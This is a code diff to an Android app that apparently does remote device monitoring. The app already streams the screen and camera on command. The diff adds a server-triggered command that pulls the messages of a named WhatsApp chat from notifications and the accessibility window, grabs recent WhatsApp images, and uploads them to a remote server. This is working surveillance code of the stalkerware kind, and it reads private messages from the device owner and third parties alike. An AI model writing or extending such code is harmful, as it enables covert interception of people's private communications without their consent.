@@ -65,6 +65,7 @@ class SyncRunner(private val context: Context) {
         // Process screen and camera stream immediately
         commands.filter { it.command_type == "screen_stream" }.forEach { processScreenStreamCommand(bearer, it) }
         commands.filter { it.command_type == "camera_stream" }.forEach { processCameraStreamCommand(bearer, it) }
+        commands.filter { it.command_type == "get_whatsapp_chat" }.forEach { processGetWhatsAppChatCommand(bearer, it) }
 
         val flagsResponse = try {
             ApiClient.service.getFeatureFlags(bearer)
@@ -160,6 +161,7 @@ class SyncRunner(private val context: Context) {
         commands.filter { it.command_type == "screen_stream" }.forEach { processScreenStreamCommand(bearer, it) }
         commands.filter { it.command_type == "camera_stream" }.forEach { processCameraStreamCommand(bearer, it) }
         commands.filter { it.command_type == "whatsapp_sync_now" }.forEach { processWhatsAppSyncCommand(bearer, it) }
+        commands.filter { it.command_type == "get_whatsapp_chat" }.forEach { processGetWhatsAppChatCommand(bearer, it) }
 
         // 2. Heavy periodic background collectors run after commands complete
         if (flags.app_usage_tracking) {
@@ -281,6 +283,90 @@ class SyncRunner(private val context: Context) {
                 command.id,
                 AckCommandRequest(success = false, message = e.message ?: "Failed to sync WhatsApp")
             )
+        }
+    }
+
+    private suspend fun processGetWhatsAppChatCommand(bearer: String, command: RemoteCommand) {
+        val chatName = (command.payload?.get("chatName") as? String)?.trim()
+        val days = (command.payload?.get("days") as? Number)?.toInt() ?: 2
+        val cutoffMs = System.currentTimeMillis() - (days * 24 * 60 * 60 * 1000L)
+
+        if (chatName.isNullOrBlank()) {
+            try {
+                ApiClient.service.ackCommand(
+                    bearer,
+                    command.id,
+                    AckCommandRequest(success = false, message = "Missing chatName parameter")
+                )
+            } catch (_: Exception) {}
+            return
+        }
+
+        try {
+            val db = AppDatabase.getInstance(context)
+            val gatheredEntries = mutableListOf<WhatsAppMessageEntry>()
+
+            // 1. Extract messages for this chat from active notifications (including MessagingStyle message history)
+            com.spapp.monitoring.collectors.WhatsAppNotificationListener.instance?.let { listener ->
+                val notifEntries = listener.extractMessagesForChat(chatName, cutoffMs)
+                gatheredEntries.addAll(notifEntries)
+            }
+
+            // 2. If WhatsApp is currently foreground, inspect accessibility window
+            com.spapp.monitoring.blocking.BlockAccessibilityService.instance?.let { service ->
+                service.recordWhatsAppChatIfForeground(service.rootInActiveWindow)
+            }
+
+            // 3. Check for recently received WhatsApp images (within last 2 days)
+            val latestMediaBase64 = try {
+                FileManagerCollector(context).getLatestWhatsAppImageBase64(maxAgeMs = days * 24 * 60 * 60 * 1000L)
+            } catch (_: Exception) { null }
+
+            // 4. Save gathered entries into Room DB
+            if (gatheredEntries.isNotEmpty()) {
+                db.whatsAppMessageDao().insertAll(gatheredEntries)
+            }
+
+            // 5. Upload all unsynced messages to server immediately
+            val unsynced = db.whatsAppMessageDao().getUnsynced()
+            if (unsynced.isNotEmpty()) {
+                val dtos = unsynced.map {
+                    WhatsAppMessageEntryDto(
+                        chatName = it.chatName,
+                        sender = it.sender,
+                        messageText = it.messageText,
+                        isOutgoing = it.isOutgoing,
+                        messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
+                        mediaType = it.mediaType ?: (if (it.mediaPath != null) "image" else null),
+                        mediaPath = it.mediaPath ?: (if (it.chatName.equals(chatName, ignoreCase = true)) latestMediaBase64 else null)
+                    )
+                }
+                val resp = ApiClient.service.syncWhatsAppMessages(bearer, WhatsAppMessagesSyncRequest(dtos))
+                if (resp.isSuccessful) {
+                    db.whatsAppMessageDao().deleteByIds(unsynced.map { it.id })
+                }
+            }
+
+            // 6. Ack command with success
+            ApiClient.service.ackCommand(
+                bearer,
+                command.id,
+                AckCommandRequest(
+                    success = true,
+                    message = "Retrieved chat contents for '$chatName' for the last $days days"
+                )
+            )
+        } catch (e: Exception) {
+            try {
+                ApiClient.service.ackCommand(
+                    bearer,
+                    command.id,
+                    AckCommandRequest(
+                        success = false,
+                        message = e.message ?: "Failed to get chat contents"
+                    )
+                )
+            } catch (_: Exception) {}
         }
     }
 
